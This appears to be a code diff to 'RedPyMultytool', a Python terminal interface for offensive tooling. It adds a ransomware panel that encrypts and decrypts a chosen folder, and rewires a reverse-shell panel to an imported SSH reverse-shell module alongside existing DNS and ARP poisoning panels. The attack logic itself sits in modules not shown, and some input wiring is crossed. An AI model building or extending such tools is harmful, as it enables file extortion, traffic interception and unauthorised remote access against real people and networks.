@@ -6,6 +6,7 @@ from rich.console import Console
 from ArpPoisoning import ArpPoison
 from DnsPoisoning import DnsPoisoning
 from threading import Thread
+from OpenRevShells import OpenSH
 import subprocess
 import traceback
 import time
@@ -30,8 +31,6 @@ class DarkSwitch(Horizontal):
 
 class Sidebar(Container):
     def compose(self) -> ComposeResult:
-        #self.a=a
-        #self.b=b
         yield Title("RedPyMultytool Navbar")
         yield Button("DNS Poisoning",id="dns", variant="success")
         yield Button("ARP Poisonins",id="arp", variant="success")
@@ -51,6 +50,7 @@ class Sidebar(Container):
                 self.app.query_one(ARPpoison).remove()
                 self.app.query_one(ReverseSH).remove()
                 self.app.query_one(DNSPoison).remove()
+                self.app.query_one(Ramsomware).remove()
             except:
                 print("f1")
             self.app.mount(self.app.get_c())
@@ -67,6 +67,7 @@ class Sidebar(Container):
                 self.app.query_one(DNSPoison).remove()
                 self.app.query_one(ReverseSH).remove()
                 self.app.query_one(ARPpoison).remove()
+                self.app.query_one(Ramsomware).remove()
             except:
                 print("f2")
             self.app.mount(self.app.get_a())
@@ -83,6 +84,7 @@ class Sidebar(Container):
                 self.app.query_one(ARPpoison).remove()
                 self.app.query_one(ReverseSH).remove()
                 self.app.query_one(DNSPoison).remove()
+                self.app.query_one(Ramsomware).remove()
             except:
                 print("f3")
             self.app.mount(self.app.get_b())
@@ -92,6 +94,14 @@ class Sidebar(Container):
             self.remove_class("rams")
             self.remove_class("wrm")
         elif button_id=="rmw":
+            try:
+                self.app.query_one(ARPpoison).remove()
+                self.app.query_one(ReverseSH).remove()
+                self.app.query_one(DNSPoison).remove()
+                self.app.query_one(Ramsomware).remove()
+            except:
+                print("f3")
+            self.app.mount(self.app.get_d())
             self.add_class("rams")
             self.remove_class("arpp")
             self.remove_class("dnsp")
@@ -105,12 +115,13 @@ class Sidebar(Container):
             self.remove_class("rams")
 
 class ReverseSH(Static):
+    t=""
+    rv=""
     inp1=Input(placeholder="0.0.0.0",id="revTIP")
-    inp2=Input(placeholder="Default 22",id="prt")
+    inp2=Input(placeholder="SSH port (22)",id="prt")
     inp3=Input(placeholder="User",id="usr")
     inp4=Input(placeholder="Password",id="pasw")
-    inp5=Input(placeholder="enter the command",id="cmd")
-    inp6=Input(placeholder="Default 4242",id="lport")
+    inp6=Input(placeholder="Random bind port",id="lport")
     tl=TextLog(highlight=True, markup=True, id="DnsLog")
     cont=Container(
         Title("Reverse Shell",id="revTitle",expand=True),
@@ -122,8 +133,6 @@ class ReverseSH(Static):
         inp3,
         Static("Password:"),
         inp4,
-        Static("command:"),
-        inp5,
         Static("Server Listener bind Port:"),
         inp6,
         Container(
@@ -138,15 +147,23 @@ class ReverseSH(Static):
     def compose(self) -> ComposeResult:
         yield self.cont
     
+    def setAndRun(self):
+        self.tl.write("Inside")
+        self.rv=OpenSH()
+        self.rv.ssh_command(ip=self.inp1.value,p=self.inp2.value,user=self.inp3.value,passwd=self.inp4.value,srvP=self.inp6.value,t=self.tl)
+        self.tl.write()
+
     def on_button_pressed(self,event:Button.Pressed) -> None:
         button_id=event.button.id
         if button_id=="revStart":
-            subprocess.call('open -a Terminal ', shell=True)
+            self.t=Thread(target=self.setAndRun)
             self.tl.write("fatto")
+            self.t.start()
 
             
 
 class DNSPoison(Static):
+    t=""
     t=""
     inp1=Input(placeholder="site url",id="Surl")
     inp2=Input(placeholder="redirect IP",id="Rip")
@@ -195,7 +212,7 @@ class DNSPoison(Static):
             self.t.start()
             self.tl.write("waiting for DNS packets...")
         elif button_id=="DnsStop":
-            self.tl.write()
+            self.tl.write("Stoped")
 
 
 
@@ -262,14 +279,59 @@ class ARPpoison(Static):
             t1.start()
         elif(button_id=="ARPstop"):
             self.arpois.ARPstop()
-    
+
+class Ramsomware(Static):
+    ciph=Ramsom()
+    inp2=Input(placeholder="PATH",id="pat")
+    inp1=Input(placeholder="key Path IP",id="kpat")
+    tl=TextLog(highlight=True, markup=True, id="ramKEYLog")
+    tl1=TextLog(highlight=True, markup=True, id="ramCryptLog")
+    cont=Container(
+        Title("Ramsomware",id="ramsTitle",expand=True),
+        Static("cryptKey: "),
+        inp1,
+        Container(
+            Button("Generate new key",id="genKEY"),
+            Button("Delete key",id="delKEY"),
+            Button("Use key",id="useKey"),
+            id="keys"
+        ),
+        tl,
+        Static("Folder path to encrypt/decript: "),
+        inp2,
+        Container(
+            Button("Encrypt",id="encr"),
+            Button("Decrypt",id="decr"),
+            id="Rams"
+        ),
+        tl1,
+        id="ramsomTUI"
+    )
+
+    def compose(self) -> ComposeResult:
+        yield self.cont
+
+    def on_button_pressed(self,event:Button.Pressed) -> None:
+        button_id=event.button.id
+        if button_id=="genKEY":
+            self.ciph.Key_gen(self.inp2.value,self.tl)
+            self.tl.write("Added on dict")
+        elif(button_id=="delKEY"):
+            self.ciph.deleteKEY(self.inp2.value,self.tl)
+        elif(button_id=="useKey"):
+            self.ciph.setKey(self.inp2.value,self.tl)
+        elif(button_id=="encr"):
+            self.ciph.crypt(self.inp1.value,self.tl1)
+        elif(button_id=="decr"):
+            self.ciph.decrypt(self.inp1.value,self.tl1)
+
 
 
 class RedPyMultytool(App):
     a=ARPpoison()
     b=ReverseSH()
     c=DNSPoison()
-    d=""
+    d=Ramsomware()
     CSS_PATH = "app.css"
     BINDINGS=[("q","quit","Exit app"),("d","toggle_dark","Toggle dark mode"),("b", "toggle_sidebar", "Sidebar"),]
     def compose(self) -> ComposeResult:
@@ -277,10 +339,8 @@ class RedPyMultytool(App):
         #yield self.c
         #yield self.b
         #yield self.a
-
         yield Sidebar(classes="-hidden")
         yield Footer()
-        yield Title("menu")
     
     def get_a(self):
         return self.a
@@ -292,7 +352,7 @@ class RedPyMultytool(App):
         return self.c
 
     def get_d(self):
-        return self.a
+        return self.d
 
 
     def action_toggle_sidebar(self) -> None:
